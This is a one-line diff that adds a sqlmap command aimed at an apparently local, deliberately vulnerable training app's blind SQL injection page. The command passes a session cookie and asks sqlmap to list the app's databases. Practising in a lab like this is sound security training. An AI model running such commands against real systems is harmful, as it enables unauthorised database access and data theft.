@@ -1,0 +1,1 @@
+sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=74je7c9qgqm20ilgtfa02rengc; security=low" --dbs
